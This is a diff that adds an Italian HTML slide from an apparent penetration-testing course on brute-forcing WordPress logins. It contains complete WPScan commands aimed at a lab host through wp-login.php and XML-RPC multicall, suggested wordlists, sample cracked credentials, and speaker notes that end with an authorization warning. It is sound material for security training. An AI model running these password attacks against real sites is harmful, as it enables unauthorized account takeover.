@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 2: WordPress Enumeration - Password Attack</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 2: WordPress Enumeration</h1>
+        <div class="subtitle">Slide 2.8: Password Brute Force</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: Strategie di Attacco Password</div>
+                <div class="card-text">
+                    <p>Con gli username identificati, possiamo tentare un attacco alle password. WPScan supporta brute force su wp-login.php e XML-RPC.</p>
+                    <br>
+                    <p><strong>Vettori di attacco:</strong></p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><code class="tech-term">/wp-login.php</code> - Login form classico</li>
+                        <li><code class="tech-term">/xmlrpc.php</code> - Multicall (più veloce)</li>
+                    </ul>
+                    <br>
+                    <p><strong>Wordlist consigliate:</strong></p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><code>/usr/share/wordlists/rockyou.txt</code></li>
+                        <li><code>/usr/share/seclists/Passwords/</code></li>
+                        <li>Wordlist custom basate sul target</li>
+                    </ul>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> Prima di rockyou.txt (14M password), provate sempre wordlist piccole con password comuni: admin, password, 123456, [nome_sito]2024, ecc.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Lab: WPScan Brute Force</div>
+                <div class="card-text">
+                    <p><strong>Brute Force via wp-login:</strong></p>
+                    <div class="code-box"><span class="text-yellow">┌──(kali㉿kali)-[~]</span>
+<span class="text-red">└─$</span> wpscan --url http://vulnerable-wp.local \
+    -U admin -P /usr/share/wordlists/rockyou.txt \
+    --password-attack wp-login -t 20</div>
+                    <br>
+                    <p><strong>Brute Force via XML-RPC (più veloce):</strong></p>
+                    <div class="code-box"><span class="text-red">└─$</span> wpscan --url http://vulnerable-wp.local \
+    -U admin,editor -P passwords.txt \
+    --password-attack xmlrpc-multicall</div>
+                    <br>
+                    <p><strong>Output di successo:</strong></p>
+                    <div class="code-box">[+] Performing password attack on Xmlrpc Multicall
+[SUCCESS] - admin / <span class="text-green">admin123</span>
+[SUCCESS] - editor / <span class="text-green">password2024</span>
+
+All Found: 
+ | Username: admin, Password: admin123
+ | Username: editor, Password: password2024</div>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "Ultimo step del capitolo 2: il password attack. A sinistra, i due metodi: wp-login (classico) o xmlrpc-multicall (più veloce).
+        XML-RPC multicall può testare centinaia di password per richiesta, bypassando molte protezioni.
+        A destra, i comandi. -U specifica gli utenti, -P la wordlist, -t i thread.
+        Il metodo xmlrpc-multicall è 10-20 volte più veloce di wp-login!
+        Nell'output, abbiamo trovato due password: 'admin123' per admin e 'password2024' per editor.
+        NOTA ETICA: il brute force va fatto solo con autorizzazione scritta. È illegale e facilmente rilevabile."
+    -->
+
+    <script>const slideNumero = 17;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
